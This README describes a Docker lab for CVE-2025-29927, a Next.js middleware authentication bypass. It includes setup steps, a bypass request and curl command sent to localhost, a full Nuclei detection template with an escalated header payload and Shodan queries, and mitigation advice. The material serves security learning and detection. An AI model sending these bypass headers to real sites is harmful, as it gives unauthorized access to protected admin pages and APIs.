# CVE-2025-29927: Next.js Middleware Authorization Bypass

## Description

This lab demonstrates a critical vulnerability in Next.js middleware that allows attackers to completely bypass security controls through the `x-middleware-subrequest` header manipulation. The vulnerability affects all Next.js versions from 11.1.4 through 15.2.2, impacting applications using middleware for authentication, authorization, or any other security controls.

## Vulnerability Details

- **CVE ID**: CVE-2025-29927
- **CVSS Score**: 9.1 Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
- **Affected Versions**: Next.js 11.1.4 - 15.2.2
- **Attack Vector**: Middleware Bypass via x-middleware-subrequest Header
- **Impact**: Authentication Bypass, Authorization Bypass, CSP Bypass, Potential DoS
- **CWE**: CWE-287 (Improper Authentication)

## Lab Setup

### Prerequisites

- Docker
- Docker Compose

### Running the Lab

1. Start the vulnerable application:
   ```bash
   docker-compose up -d
   ```

2. The application will be available at:
   - Main application: http://localhost:3000
   - Protected routes:
     - Dashboard: http://localhost:3000/dashboard
     - Admin Panel: http://localhost:3000/admin
     - Profile: http://localhost:3000/profile
     - API Secret: http://localhost:3000/api/secret

## Vulnerability Exploitation

The vulnerability can be exploited by adding the `x-middleware-subrequest` header with specific values depending on the Next.js version:

### For Next.js 14.0.0 (Lab Version):
```http
GET /admin
Host: localhost:3000
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```

You can test this using curl:
```bash
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3000/admin
```

## Protected Resources

The lab includes several protected resources:
1. `/dashboard` - Protected dashboard page
2. `/admin` - Protected admin panel
3. `/profile` - Protected user profile
4. `/api/secret` - Protected API endpoint

All these routes are protected by middleware and will redirect to `/unauthorized` unless bypassed.

## Nuclei Template

```yaml
id: CVE-2025-29927

info:
  name: Next.js Middleware Bypass
  author: pdresearch,pdteam
  severity: critical
  description: |
    Next.js contains a critical middleware bypass vulnerability affecting versions 11.1.4 through 15.2.2.
    The vulnerability allows attackers to bypass middleware security controls by sending a specially crafted
    'x-middleware-subrequest' header, which can lead to authorization bypass and other security control circumvention.
  reference:
    - https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
    - https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
    - https://slcyber.io/assetnote-security-research-center/doing-the-due-diligence-analysing-the-next-js-middleware-bypass-cve-2025-29927/
  remediation: |
    Upgrade to Next.js 14.2.25 or 15.2.3 or later.
    If upgrading is not possible, block the x-middleware-subrequest header at the WAF or server level.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-287
  metadata:
    max-request: 1
    shodan-query: x-middleware-rewrite
    fofa-query: x-middleware-rewrite
    product: next.js
    vendor: zeit
  tags: cve,cve2025,nextjs,middleware,auth-bypass

flow: |
  http(1)
  for(let endpoint_urls of iterate(template.endpoints)){
    set("endpoints", endpoint_urls)
    http(2) && http(3)
  }

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: word
        part: body
        words:
          - "_next/static"
        internal: true

      - type: word
        part: header
        words:
          - "Next.js"
        internal: true

    extractors:
      - type: regex
        name: endpoints
        part: body
        group: 1
        regex:
          - "href=['\"](\\/[^\\.\"']+)['\"]"
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}{{endpoints}}"

    matchers:
      - type: dsl
        dsl:
          - contains_any(to_lower(header), 'x-middleware-rewrite', 'x-middleware-next', 'x-middleware-redirect') && status_code != 200
          - contains_any(to_lower(location), 'unauthorized') && status_code != 200
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}{{endpoints}}"
    headers:
      X-Middleware-Subrequest: "src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware"

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
```

## Mitigation

1. Upgrade to patched versions:
   - Next.js 15.2.3 or later
   - Next.js 14.2.25 or later for 14.x users

2. If unable to upgrade, implement a WAF rule or reverse proxy configuration to block requests containing the `x-middleware-subrequest` header.

## Reference

- [Next.js Middleware Request Corruption Research](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware)
- [Security Advisory](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw)

## Security Notes

This is a deliberately vulnerable application for security research and learning purposes. Do not deploy in production environments.

## Nuclei Template URL : [CVE-2025-29927](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-29927.yaml)

## Nuclei Command :

```bash
nuclei -t CVE-2025-29927.yaml -u http://0.0.0.0:3000 -vv
```

![image](https://github.com/user-attachments/assets/dc3683aa-e110-440c-b383-632b6e0bdef4)
